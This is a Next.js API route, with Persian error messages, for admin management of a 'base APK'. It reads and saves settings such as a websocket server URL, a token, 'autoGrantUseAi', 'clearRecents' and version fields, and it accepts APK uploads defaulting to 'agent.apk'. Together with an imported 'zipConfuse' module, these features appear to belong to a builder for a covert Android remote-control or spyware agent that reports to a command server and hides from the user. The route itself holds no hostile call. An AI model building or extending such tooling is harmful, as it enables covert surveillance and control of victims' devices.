import { NextResponse } from 'next/server';

import { isAccess, requireGlobalAdmin } from '@/server/auth/access';
import {
  baseApkReady,
  isValidApkServerUrl,
  isValidVersionCode,
  isValidVersionName,
  readBaseApkMeta,
  readBaseSettings,
  saveBaseApk,
  saveBaseSettings,
  type BaseApkSettings,
} from '@/server/telegram/apkSigner/baseStore';
import { isZipApk } from '@/server/telegram/apkSigner/zipConfuse';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

function settingsResponse(settings: BaseApkSettings) {
  return {
    serverUrl: settings.serverUrl,
    token: settings.token,
    frameKey: settings.frameKey,
    autoGrantUseAi: settings.autoGrantUseAi,
    watchMarkEye: settings.watchMarkEye,
    watchDumpFab: settings.watchDumpFab,
    clearRecents: settings.clearRecents,
    versionName: settings.versionName,
    versionCode: settings.versionCode || undefined,
  };
}

export async function GET(request: Request) {
  const access = await requireGlobalAdmin(request);
  if (!isAccess(access)) return access;
  const settings = readBaseSettings();
  return NextResponse.json({
    ready: baseApkReady(),
    meta: readBaseApkMeta(),
    ...settingsResponse(settings),
  });
}

export async function PUT(request: Request) {
  const access = await requireGlobalAdmin(request);
  if (!isAccess(access)) return access;
  let body: Partial<BaseApkSettings> & { versionCode?: number | string };
  try {
    body = (await request.json()) as typeof body;
  } catch {
    return NextResponse.json({ error: 'invalid body' }, { status: 400 });
  }

  const patch: Partial<BaseApkSettings> = {};
  if (typeof body.serverUrl === 'string') {
    const serverUrl = body.serverUrl.trim();
    if (!isValidApkServerUrl(serverUrl)) {
      return NextResponse.json(
        { error: 'serverUrl باید با ws:// یا wss:// شروع شود' },
        { status: 400 },
      );
    }
    patch.serverUrl = serverUrl;
  }
  if (typeof body.token === 'string') {
    if (body.token.trim().length > 512) {
      return NextResponse.json({ error: 'token خیلی بلند است' }, { status: 400 });
    }
    patch.token = body.token.trim();
  }
  if (typeof body.frameKey === 'string') {
    if (body.frameKey.trim().length > 256) {
      return NextResponse.json({ error: 'frameKey خیلی بلند است' }, { status: 400 });
    }
    patch.frameKey = body.frameKey.trim();
  }
  if (typeof body.autoGrantUseAi === 'boolean') patch.autoGrantUseAi = body.autoGrantUseAi;
  if (typeof body.watchMarkEye === 'boolean') patch.watchMarkEye = body.watchMarkEye;
  if (typeof body.watchDumpFab === 'boolean') patch.watchDumpFab = body.watchDumpFab;
  if (typeof body.clearRecents === 'boolean') patch.clearRecents = body.clearRecents;
  if (typeof body.versionName === 'string') {
    const versionName = body.versionName.trim();
    if (!isValidVersionName(versionName)) {
      return NextResponse.json({ error: 'نسخه نامعتبر است' }, { status: 400 });
    }
    patch.versionName = versionName;
  }
  if (body.versionCode !== undefined && body.versionCode !== null && `${body.versionCode}` !== '') {
    const versionCode = Number(body.versionCode);
    if (!isValidVersionCode(versionCode)) {
      return NextResponse.json({ error: 'کد نسخه باید عدد ≥ ۱ باشد' }, { status: 400 });
    }
    patch.versionCode = versionCode;
  }

  if (Object.keys(patch).length === 0) {
    return NextResponse.json({ error: 'nothing to save' }, { status: 400 });
  }

  const settings = saveBaseSettings(patch);
  return NextResponse.json({
    ok: true,
    ready: baseApkReady(),
    meta: readBaseApkMeta(),
    ...settingsResponse(settings),
  });
}

export async function POST(request: Request) {
  const access = await requireGlobalAdmin(request);
  if (!isAccess(access)) return access;

  let buffer: Buffer;
  let fileName = 'agent.apk';
  const contentType = request.headers.get('content-type') || '';
  try {
    if (contentType.includes('multipart/form-data')) {
      const form = await request.formData();
      const file = form.get('file');
      if (!(file instanceof File)) {
        return NextResponse.json({ error: 'file required' }, { status: 400 });
      }
      fileName = file.name || fileName;
      buffer = Buffer.from(await file.arrayBuffer());
    } else {
      const body = (await request.json()) as { fileName?: string; dataBase64?: string };
      fileName = body.fileName || fileName;
      const raw = (body.dataBase64 || '').replace(/^data:[^;]+;base64,/, '');
      if (!raw) {
        return NextResponse.json({ error: 'dataBase64 required' }, { status: 400 });
      }
      buffer = Buffer.from(raw, 'base64');
    }
  } catch {
    return NextResponse.json({ error: 'invalid body' }, { status: 400 });
  }

  if (buffer.length < 1000 || buffer.length > 80 * 1024 * 1024) {
    return NextResponse.json({ error: 'invalid size' }, { status: 400 });
  }
  if (!isZipApk(buffer) && !fileName.toLowerCase().endsWith('.apk')) {
    return NextResponse.json({ error: 'not an apk' }, { status: 400 });
  }

  const meta = saveBaseApk(buffer, fileName);
  const settings = readBaseSettings();
  return NextResponse.json({
    ok: true,
    ready: true,
    meta,
    ...settingsResponse(settings),
  });
}
